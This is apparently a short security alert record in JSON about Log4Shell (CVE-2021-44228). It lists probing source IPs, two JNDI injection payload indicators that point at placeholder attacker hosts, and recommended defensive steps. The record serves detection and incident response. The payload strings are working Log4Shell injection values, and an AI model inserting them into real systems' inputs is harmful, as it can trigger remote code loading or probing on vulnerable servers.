{
  "cve": "CVE-2021-44228",
  "vulnerability": "log4shell",
  "source_ips": ["203.0.113.42", "198.51.100.77"],
  "payload_indicators": ["${jndi:ldap://attacker.invalid/a}", "${jndi:dns://probe.invalid/b}"],
  "recommended_action": "Block the probing sources, search for JNDI lookups in application logs, verify patched Log4j versions, and rotate exposed secrets if exploitation is confirmed."
}
